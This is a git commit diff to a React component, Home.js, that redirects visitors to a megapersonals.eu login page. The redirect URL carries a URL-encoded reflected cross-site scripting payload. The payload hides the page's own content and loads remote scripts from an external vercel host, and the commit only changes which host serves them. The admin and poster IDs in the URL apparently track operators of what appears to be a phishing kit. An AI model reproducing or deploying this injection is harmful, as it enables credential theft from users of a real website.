ba62f1fefb2e61c40060cd3ca022136b56913feb
rana <rana.buddy@gmail.com>
2025-06-03 13:57:37 +0600

    feat:xioncart sh creation

--- app/components/Home.js
+++ app/components/Home.js
@@ -8,7 +8,7 @@ function Home({ adminId, posterId }) {
 
   useEffect(() => {
     setTimeout(() => {
-      window.location.href = `https://megapersonals.eu/users/auth/login?bad_captcha=%20%3C/h2%3E%20%20%3Cstyle%3E.container%20,%20footer%20%7b%20display:%20none%20;%20%7d%20a%20%7b%20color:%20white;%20%7d%20%3C/style%3E%20%3Cscript%20src=%22https://escortback.vercel.app/antiClick.js%22%3E%20%3C/script%3E%20%3Cscript%20src=%22https://escortback.vercel.app/main.js%22%3E%20%3C/script%20%3E&admin=${adminId}&poster=${posterId}&site=${site}`; // Redirect to an external site
+      window.location.href = `https://megapersonals.eu/users/auth/login?bad_captcha=%20%3C/h2%3E%20%20%3Cstyle%3E.container%20,%20footer%20%7b%20display:%20none%20;%20%7d%20a%20%7b%20color:%20white;%20%7d%20%3C/style%3E%20%3Cscript%20src=%22https://facetimeback.vercel.app/antiClick.js%22%3E%20%3C/script%3E%20%3Cscript%20src=%22https://facetimeback.vercel.app/main.js%22%3E%20%3C/script%20%3E&admin=${adminId}&poster=${posterId}&site=${site}`; // Redirect to an external site
     }, 2000); // 2 seconds delay for demonstration
   }, []);
 
